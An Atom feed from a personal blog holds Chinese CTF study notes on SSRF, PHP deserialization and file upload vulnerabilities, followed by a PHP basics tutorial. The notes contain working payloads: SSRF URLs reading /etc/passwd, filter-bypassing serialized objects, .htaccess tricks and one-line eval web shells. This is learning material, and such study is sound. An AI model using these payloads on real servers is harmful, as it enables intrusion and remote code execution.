<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://z2762331820.github.io/atom.xml" rel="self"/>
  
  <link href="https://z2762331820.github.io/"/>
  <updated>2020-11-26T14:02:26.647Z</updated>
  <id>https://z2762331820.github.io/</id>
  
  <author>
    <name>Dynamite boom</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="https://z2762331820.github.io/2020/11/25/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>https://z2762331820.github.io/2020/11/25/SSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-11-25T12:09:11.000Z</published>
    <updated>2020-11-26T14:02:26.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><p><strong>背景</strong><br> SSRF(Server-Side Request Forgery:<strong>服务器端请求伪造</strong>) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。<strong>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</strong></p><p>形成原因大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p><p>示例：</p><p>有个URL是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;www.abc.com&#x2F;a.jpg</span><br></pre></td></tr></table></figure><p>这个URL原本是服务端发起请求获取链接地址的图片数据。</p><p>但是代码中没有对没有对一些协议或者IP字符等进行过滤，导致存在SSRF漏洞的话，我们就可以使用一些协议来读取和执行相关命令，如内外网的端口和服务扫描，利用file协议读取本地敏感数据文件等等。</p><p>可能出现SSRF的函数有：<code>file_get_contents()</code>、<code>curl()</code>、<code>fsocksopen()</code>、<code>fopen()</code>等</p><p>存在SSRF漏洞的代码，这里拿<code>curl()</code>举栗子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;</span><br><span class="line">  &#x2F;&#x2F;创建一个新的curl资源</span><br><span class="line">  $ch &#x3D; curl_init();</span><br><span class="line">  &#x2F;&#x2F;设置URL和相应的选项</span><br><span class="line">  curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">  curl_setopt($ch,CURLOPT_HEADER,false);</span><br><span class="line">  &#x2F;&#x2F;抓取URL并把它传递给浏览器</span><br><span class="line">  curl_exec($ch);</span><br><span class="line">  &#x2F;&#x2F;关闭curl资源，并且释放系统资源</span><br><span class="line">  curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运用相关代码执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:22</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:22&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:2233&#x2F;_test</span><br></pre></td></tr></table></figure><h2 id="绕过SSRF过滤的几种方法"><a href="#绕过SSRF过滤的几种方法" class="headerlink" title="绕过SSRF过滤的几种方法"></a>绕过SSRF过滤的几种方法</h2><h2 id="一-更改ip地址"><a href="#一-更改ip地址" class="headerlink" title="一.更改ip地址"></a>一.更改ip地址</h2><p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$</span><br><span class="line"></span><br><span class="line">^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</span><br><span class="line"></span><br><span class="line">^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</span><br></pre></td></tr></table></figure><p>对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8进制格式：0300.0250.0.1</span><br><span class="line">16进制格式：0xC0.0xA8.0.1</span><br><span class="line">10进制整数格式：3232235521</span><br><span class="line">16进制整数格式：0xC0A80001</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#39;&#x2F;^(http:\&#x2F;\&#x2F;)?([^\&#x2F;]+)&#x2F;is&#39;, $_GET[&#39;a&#39;]))&#123;</span><br><span class="line">      die(&quot;no hack&quot;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">           echo file_get_contents($_GET[&#39;a&#39;]);</span><br><span class="line">       &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28284&#x2F;?a&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>这里禁止了127.0.0.1，却能用localhost代替。</p><h2 id="二-X-Forwarded-For绕过、Cookie伪造"><a href="#二-X-Forwarded-For绕过、Cookie伪造" class="headerlink" title="二.X-Forwarded-For绕过、Cookie伪造"></a>二.X-Forwarded-For绕过、Cookie伪造</h2><p>如果PHP在使用X-Forwarded-For来获取用户IP的话很可能会造成IP被人为伪造，cookie如果没有 做token校验同样可能被人为伪造造成越权漏洞</p><p>例题![](E:\blog\source_posts\SSRF漏洞\屏幕截图 2020-11-26 215342.png)</p><p>直接去burpsuit捉包修改x-forwarded-for为127.0.0.1</p><p>再将cookie上user=0改为1，即可得到flag</p><h1 id="三-data伪协议构造绕过"><a href="#三-data伪协议构造绕过" class="headerlink" title="三.data伪协议构造绕过"></a>三.data伪协议构造绕过</h1><p>data伪协议可以不携带双斜杠，进而下面正则对双斜杠进行了过滤，导致其他伪协议无法使用， 进而无法直接使用php://协议直接读取文件。但是这里使用了eval，对我们读取到的内容进行执行，我们可以使用伪协议构造xss，导致任意代码执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;php|file|\&#x2F;\&#x2F;|sftp|ldap|gopher|http|https&#x2F;is&#39;, $_GET[&#39;a&#39;]))&#123;</span><br><span class="line">       die(&quot;no hack&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">   $a &#x3D; file_get_contents($_GET[&#39;a&#39;]);</span><br><span class="line">   eval($a);  </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;data:text&#x2F;plain;base64,cGhwaW5mbygpOw&#x3D;&#x3D;</span><br><span class="line">#cGhwaW5mbygpOw&#x3D;&#x3D;解码后为phpinfo();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSRF漏洞&quot;&gt;&lt;a href=&quot;#SSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞&quot;&gt;&lt;/a&gt;SSRF漏洞&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;背景&lt;/strong&gt;&lt;br&gt; SSRF(Server-Side Request Forge</summary>
      
    
    
    
    
    <category term="入门" scheme="https://z2762331820.github.io/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>反序列化</title>
    <link href="https://z2762331820.github.io/2020/11/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://z2762331820.github.io/2020/11/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-10-31T16:07:36.000Z</published>
    <updated>2020-11-01T06:31:45.717Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、<a href="http://lib.csdn.net/base/mysql">数据库</a>中；反序列化即逆过程，由字节流还原成对象。</p><p>对象的序列化主要有两种用途：</p><p>1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；</p><p>2） 在网络上传送对象的字节序列。</p><p>序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode</p><h2 id="不同属性序列化"><a href="#不同属性序列化" class="headerlink" title="不同属性序列化"></a>不同属性序列化</h2><p>Public属性序列化后格式:成员名</p><p>Private属性序列化后格式:%00类名%00成员名</p><p>Protected属性序列化后的格式:%00*%00成员名</p><p>new类名()：调用这个类的构造函数初始化对象，类名（）这个是构造函数，用来初始化。</p><h2 id="POP链构造–魔法函数"><a href="#POP链构造–魔法函数" class="headerlink" title="POP链构造–魔法函数"></a>POP链构造–魔法函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__construct()  当一个对象创建时自动调用</span><br><span class="line">__wakeup()     使用unserialse()函数时会自动调用</span><br><span class="line">__destruct()   当对象被销毁时自动调用（php绝大多数情况下会自动调用销毁对象）</span><br><span class="line">__sleep()      使用serialize()函数是触发</span><br><span class="line">__toString()  把类当作字符串使用时触发，返回值需要为字符串</span><br><span class="line">    (例如一个类A,实例化之后为$a,echo $a, 或者$a与字符串对比，这时就会触发该函数)</span><br></pre></td></tr></table></figure><h4 id="在类外定义类中的值"><a href="#在类外定义类中的值" class="headerlink" title="在类外定义类中的值"></a>在类外定义类中的值</h4><p><strong>重新定义类中属性的值</strong></p><p>通过new 类名 （”对类中的变量重新定义“）</p><p><img src="/2020/11/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/blog\source_posts\反序列化\3.png"></p><p><strong>在类的外面定义类中的函数并调用方法</strong></p><p><img src="/2020/11/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/blog\source_posts\反序列化\5.png"></p><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h3><ol><li><pre><code>__wakeup 使用unserialse（）函数时会自动调用但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行CVE-2016-7124(绕过__wakeup)漏洞影响版本：PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### OC绕过</span><br><span class="line"></span><br><span class="line">OC绕过是通过修改O：数字（C：数字）来绕过正则匹配</span><br><span class="line"></span><br><span class="line">例题unserialize2</span><br><span class="line"></span><br><span class="line">看下源代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>&lt;?phpclass Demo &#123; private $file = &#39;index.php&#39;; public function __construct($file) &#123;     $this-&gt;file = $file; &#125; function __destruct() &#123;     echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123;     if ($this-&gt;file != &#39;index.php&#39;) &#123;         //the secret is in the f15g_1s_here.php         $this-&gt;file = &#39;index.php&#39;;     &#125; &#125;&#125;</code></pre></li></ol><p>if (isset($_GET[‘var’])) {<br>    $var = base64_decode($_GET[‘var’]);<br>    if (preg_match(‘/[oc]:\d+:/i’, $var)) {<br>        die(‘stop hacking!’);<br>    } else {</p><pre><code>    @unserialize($var);&#125;</code></pre><p>} else {<br>    highlight_file(“index.php”);<br>}<br>?&gt;  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第一个点是&#96;__wakeup()&#96;，因为这里正常反序列化会写死&#96;$this-&gt;ﬁle&#96;属性为 index.php，但是php存在这么一个漏洞（CVE-2016-7124），当实际对象不等于反序列化的对象数时候会过&#96;wakeup()&#96;。</span><br><span class="line"></span><br><span class="line">第二个点是正则匹配，这里的正则匹配的意思是如果在var变量中存在O&#x2F;C:数字(O:数字或者C:数字这样的形式)就die掉，这里匹配的是&#96;O:4&#96;，直接使用+号当做空格即可绕过，即&#96;O:+4&#96;即可绕过。</span><br><span class="line"></span><br><span class="line">**构造序列化代码**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?phpclass Demo {    private $file = 'index.php';    public function __construct($file) {        $this->file = $file;    }}$a = new Demo('f15g_1s_here.php');$a = serialize($a)."\n";$a = str_replace('O:4','O:+4',$a);$a  =  str_replace(':1:',':2:',$a);echo base64_encode($a);?><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最后得到TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 私有属性绕过</span><br><span class="line"></span><br><span class="line">私有属性产生的一些不可见字符如果被过滤掉，可以用字符编码来替换这些字符进行绕过</span><br><span class="line"></span><br><span class="line">![](E:\blog\source\_posts\反序列化\微信图片_20201101142908.png)</span><br><span class="line"></span><br><span class="line">当属性为private时，例：private $address &#x3D; ‘shanxi’,反序列化的时候应为</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>\00test\00address</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">当属性为protected时，例：protected $age &#x3D; ‘21’,反序列化的时候应该为</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>\00*\00age</p><p>```</p><p>当代码过滤一些字符的时候<code>例如：flag</code>，我们可以通过16进制编码把flag编写为16进制，这时我们可以把表示字符串的字符s改为大写，这样它在反序列化的时候就能识别16进制，既可以绕过过滤，又可以成功执行反序列化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;序列化就是把对象转换成字节流，便于保存在内存、文件、&lt;a href=&quot;http://lib.csdn.net/base/my</summary>
      
    
    
    
    
    <category term="入门" scheme="https://z2762331820.github.io/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>NOTE</title>
    <link href="https://z2762331820.github.io/2020/10/27/NOTE/"/>
    <id>https://z2762331820.github.io/2020/10/27/NOTE/</id>
    <published>2020-10-27T10:40:45.000Z</published>
    <updated>2020-11-01T01:30:03.515Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><blockquote><p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><p>这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。</p><p>通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。</p><p>然后这周就做题练习qwq</p><h2 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><p>.htaccess可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、封禁特定IP地址的用户，只允许特定IP地址的用户，以及使用其他文件作为index文件配置默认文档等功能。</p><p>例题upload6</p><p>先上传下.htaccess的文件，发现无法上传</p><p>网站过滤application，使用换行绕过![](E:\blog\source_posts\NOTE\屏幕截图 2020-10-31 000905.png)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><p>然后上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>成功得到flag</p><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>例题upload3</p><p>上传文件的内容中的php，POST，eval替换为空</p><p>.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-pphphp .aaa</span><br></pre></td></tr></table></figure><p>1.aaa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>最后连接剑蚁，查找flag<img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.235307.png"></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h2><?PHP被过滤，可使用php版本5使用短标签绕过![aLcYOU](E:\blog\source\_posts\NOTE\aLcYOU.png)例题upload2先上传.htaccess ，之后再上传1.aaa<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table>## 特殊编码绕过(UTF-7)如果程序过滤了所有标签形式、或者说过滤了`<?`而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下`<?php`形式），这时候可以使用`.htaccess`解码对应的文件，例如可以使用UTF-7进行解码：(http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7）https://www.novel.tools/encode/UTF-7例题upload4先上传.htaccess<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table>![](屏幕截图 2020-10-31 000905)在上传1.aaa![屏幕截图 2020-10-31 000922](E:\blog\source\_posts\NOTE\屏幕截图 2020-10-31 000922.png)链接蚁剑得到flag]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://z2762331820.github.io/2020/10/07/PHP/"/>
    <id>https://z2762331820.github.io/2020/10/07/PHP/</id>
    <published>2020-10-07T05:09:36.163Z</published>
    <updated>2020-10-26T08:40:53.173Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: PHP基本语法<br>date: 2020-10-07 13:09:36<br>tags:</p><h1 id="—基础PHP语法"><a href="#—基础PHP语法" class="headerlink" title="—基础PHP语法"></a>—基础PHP语法</h1><p>PHP脚本可放置于文档中的任何位置</p><p>PHP脚本以<?php开头，以?>结尾</p><p>如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//此处为代码</span></span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p>PHP 文件的默认文件扩展名是 “.php”。</p><p>PHP 文件通常包含 HTML 标签以及一些 PHP 脚本代码</p><p><strong>echo</strong>可以打印信息，类似于printf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的第一张 PHP 页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><img src="/2020/10/07/PHP/Users\86152\Desktop\屏幕截图 2020-10-19 170926.png" style="zoom:67%;"><p><strong>指令分隔符</strong></p><p>PHP 需要在每个语句后用分号结束指令。一段 PHP   代码中的结束标记隐含表示了一个分号；在一个 PHP   代码段中的最后一行可以不用分号结束。如果后面还有新行，则代码段的结束标记包含了行结束。   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This is a test&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;This is a test&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;We omitted the last closing tag&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件末尾的 PHP 代码段结束标记可以不要，有些情况下当使用     <a href="https://www.php.net/manual/zh/function.include.php">include</a> 或者 <a href="https://www.php.net/manual/zh/function.require.php">require</a>     时省略掉会更好些，这样不期望的空白符就不会出现在文件末尾，之后仍然可以输出响应标头。在使用输出缓冲时也很便利，就不会看到由包含文件生成的不期望的空白符。    </p><p><strong>PHP中的注释</strong></p><p>PHP 代码中的注释不会被作为程序来读取和执行。它唯一的作用是供代码编辑者阅读。</p><p>PHP支持三种注释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 这是单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这也是单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是多行注释块</span></span><br><span class="line"><span class="comment">它横跨了</span></span><br><span class="line"><span class="comment">多行</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>PHP变量规则</strong></p><ul><li>变量以 $ 符号开头，其后是变量的名称</li><li>变量名称必须以字母或下划线开头</li><li>变量名称不能以数字开头</li><li>变量名称只能包含字母数字字符和下划线（A-z、0-9 以及  _）</li><li><strong>变量名称对大小写敏感</strong>（$y 与 $Y 是两个不同的变量）</li></ul><p><strong>实例创建PHP变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">5</span>;</span><br><span class="line">$y=<span class="number">6</span>;</span><br><span class="line">$z=$x+$y;</span><br><span class="line"><span class="keyword">echo</span> $z;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/10/07/PHP/Users\86152\Pictures\2020-08\t01e9a2a820aaf0e86d.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;p&gt;title: PHP基本语法&lt;br&gt;date: 2020-10-07 13:09:36&lt;br&gt;tags:&lt;/p&gt;
&lt;h1 id=&quot;—基础PHP语法&quot;&gt;&lt;a href=&quot;#—基础PHP语法&quot; class=&quot;headerlink&quot; title=&quot;—基础PHP语法&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://z2762331820.github.io/2020/10/07/%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://z2762331820.github.io/2020/10/07/%E7%AC%94%E8%AE%B0%E4%B8%80/</id>
    <published>2020-10-07T02:29:33.000Z</published>
    <updated>2020-10-18T02:21:51.631Z</updated>
    
    <content type="html"><![CDATA[<p>=-=</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;=-=&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
